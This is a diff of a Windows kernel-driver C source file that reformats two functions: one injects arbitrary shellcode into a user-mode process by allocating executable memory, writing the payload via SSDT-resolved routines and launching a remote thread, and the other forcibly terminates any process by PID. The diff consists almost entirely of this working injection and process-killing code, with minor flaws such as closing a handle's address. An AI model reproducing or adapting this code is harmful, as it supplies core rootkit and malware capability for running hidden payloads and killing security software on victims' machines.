@@ -15,7 +15,15 @@ Copyright (c) Fluxuss Software Security, LLC
 #include "ProcessInjector.h"
 
 
-NTSTATUS InjectShellcodeOnUsermodeProcess(SIZE_T szPid, PVOID pNtWriteSsdt, PVOID pZwCreateThreadExSsdt, unsigned char* chShellcode, ULONG ulShellcode) {
+NTSTATUS InjectShellcodeOnUsermodeProcess(
+    
+    _In_ SIZE_T szPid,
+    _In_ PVOID pNtWriteSsdt,
+    _In_ PVOID pZwCreateThreadExSsdt,
+    _In_ unsigned char* chShellcode,
+    _In_ ULONG ulShellcode
+
+) {
 
     OBJECT_ATTRIBUTES objectAtributes = { 0 };
     CLIENT_ID clientId = { 0 };
@@ -24,64 +32,132 @@ NTSTATUS InjectShellcodeOnUsermodeProcess(SIZE_T szPid, PVOID pNtWriteSsdt, PVOI
 
     objectAtributes.Length = 48;
 
-    memset(&objectAtributes.RootDirectory, 0, 20);
+    memset( _Out_ &objectAtributes.RootDirectory, _In_ 0, _In_ 20 );
     
     objectAtributes.SecurityDescriptor = NULL;
     
     objectAtributes.SecurityQualityOfService = NULL;
 
-    clientId.UniqueProcess = (HANDLE)szPid;
+    clientId.UniqueProcess = ( HANDLE )szPid;
     
-    clientId.UniqueThread = (HANDLE)0;
+    clientId.UniqueThread = ( HANDLE )0;
 
     PVOID baseAddress = NULL;
 
-    NTSTATUS ntStatus = ZwOpenProcess(&hProcess, 0x1FFFFFu, &objectAtributes, &clientId);
+    NTSTATUS ntStatus = ZwOpenProcess(
+        
+        _Out_ &hProcess,
+        _In_ 0x1FFFFF,
+        _In_ &objectAtributes,
+        _In_opt_ &clientId
+    
+    );
 
-    if (NT_SUCCESS(ntStatus)) {
+    if ( NT_SUCCESS( ntStatus ) ) {
 
-        SIZE_T szShellcode = (ULONG)ulShellcode+1;
+        SIZE_T szShellcode = ( ULONG )ulShellcode+1;
 
-        ntStatus = ZwAllocateVirtualMemory(hProcess, &baseAddress, 0, &szShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        ntStatus = ZwAllocateVirtualMemory(
+            
+            _In_ hProcess,
+            _Inout_ &baseAddress,
+            _In_ 0,
+            _Inout_ &szShellcode,
+            _In_ MEM_COMMIT | MEM_RESERVE,
+            _In_ PAGE_EXECUTE_READWRITE
+        
+        );
 
-        if (NT_SUCCESS(ntStatus)) {
+        if ( NT_SUCCESS( ntStatus ) ) {
 
-            NtWriteVirtualMemory = (_NtWriteVirtualMemory)pNtWriteSsdt;
+            NtWriteVirtualMemory = ( _NtWriteVirtualMemory )pNtWriteSsdt;
 
-            ZwCreateThreadEx = (_ZwCreateThreadEx)pZwCreateThreadExSsdt;
+            ZwCreateThreadEx = ( _ZwCreateThreadEx )pZwCreateThreadExSsdt;
 
-            if (NtWriteVirtualMemory == NULL || !MmIsAddressValid(pNtWriteSsdt)) {
+            if ( NtWriteVirtualMemory == NULL || !MmIsAddressValid(
+                
+                _In_ pNtWriteSsdt
+            
+            ) ) {
 
-                ZwClose(hProcess);
+                ZwClose(
+                    
+                    _In_ hProcess
+                
+                );
 
                 return STATUS_UNSUCCESSFUL;
             }
 
-            ntStatus = NtWriteVirtualMemory(hProcess, baseAddress, chShellcode, ulShellcode+1, NULL);
+            ntStatus = NtWriteVirtualMemory(
+                
+                _In_ hProcess,
+                _In_opt_ baseAddress,
+                _In_ chShellcode,
+                _In_ ulShellcode+1,
+                _Out_opt_ NULL
+            
+            );
 
-            ULONG_PTR ulBaseAddress = (ULONG_PTR)baseAddress;
+            ULONG_PTR ulBaseAddress = ( ULONG_PTR )baseAddress;
 
             ulBaseAddress += 0x2A;
 
-            baseAddress = (PVOID)ulBaseAddress;
+            baseAddress = ( PVOID )ulBaseAddress;
 
-            ntStatus = ZwCreateThreadEx(&hThread, 0x1FFFFFi64, 0, hProcess, (PUSER_THREAD_START_ROUTINE)baseAddress, 0, 0i64,
-                0i64,
-                0i64,
-                0i64,
-                0i64);
+            ntStatus = ZwCreateThreadEx(
+                
+                _Out_ &hThread,
+                _In_ 0x1FFFFF,
+                _In_ 0,
+                _In_ hProcess,
+                _In_ ( PUSER_THREAD_START_ROUTINE )baseAddress,
+                _In_ 0,
+                _In_ 0,
+                _In_ 0,
+                _In_ 0,
+                _In_ 0,
+                _In_ 0
+            
+            );
 
-            ZwWaitForSingleObject(hThread, 0, 0i64);
+            ZwWaitForSingleObject(
+                
+                _In_ hThread,
+                _In_ 0,
+                _In_opt_ 0
+            
+            );
 
-            ZwClose(&hThread);
+            ZwClose(
+                
+                _In_ &hThread
+            
+            );
 
-            ZwClose(hProcess);
+            ZwClose(
+                
+                _In_ hProcess
+            
+            );
 
-            DbgPrintEx(0, 0, "Foi :)");
+            DbgPrintEx(
+                
+                _In_ 0,
+                _In_ 0,
+                _In_ "Foi :)"
+            
+            );
 
-            if (NT_SUCCESS(ntStatus)) return STATUS_SUCCESS;
+            if ( NT_SUCCESS( ntStatus ) ) return STATUS_SUCCESS;
         }
-        else DbgPrintEx(0, 0, "Felicidade de pobre dura pouco viu...");
+        else DbgPrintEx(
+            
+            _In_ 0,
+            _In_ 0,
+            _In_ "Felicidade de pobre dura pouco viu..."
+        
+        );
 
     }
 
@@ -89,7 +165,11 @@ NTSTATUS InjectShellcodeOnUsermodeProcess(SIZE_T szPid, PVOID pNtWriteSsdt, PVOI
 }
 
 
-NTSTATUS TerminateUsemodeProcess(SIZE_T szPid) {
+NTSTATUS TerminateUsemodeProcess(
+    
+    _In_ SIZE_T szPid
+
+) {
 
     NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
 
@@ -101,19 +181,31 @@ NTSTATUS TerminateUsemodeProcess(SIZE_T szPid) {
 
     objAttibutes.Length = 48;
 
-    memset(&objAttibutes.RootDirectory, 0, 20);
+    memset( _Out_ &objAttibutes.RootDirectory, _In_ 0, _In_ 20 );
 
     objAttibutes.SecurityDescriptor = 0;
 
     objAttibutes.SecurityQualityOfService = 0;
 
-    clientID.UniqueProcess = (HANDLE)szPid;
-    clientID.UniqueThread = (HANDLE)0;
+    clientID.UniqueProcess = ( HANDLE )szPid;
+    clientID.UniqueThread = ( HANDLE )0;
 
-    ntStatus = ZwOpenProcess(&hProc, 0x1FFFFFu, &objAttibutes, &clientID);
+    ntStatus = ZwOpenProcess(
+        
+        _Out_ &hProc,
+        _In_ 0x1FFFFF,
+        _In_ &objAttibutes,
+        _In_opt_ &clientID
+    
+    );
 
-    if (NT_SUCCESS(ntStatus))
-        return ZwTerminateProcess(hProc, 0);
+    if ( NT_SUCCESS( ntStatus ) )
+        return ZwTerminateProcess(
+            
+            _In_opt_ hProc,
+            _In_ 0
+        
+        );
 
     return ntStatus;
 }
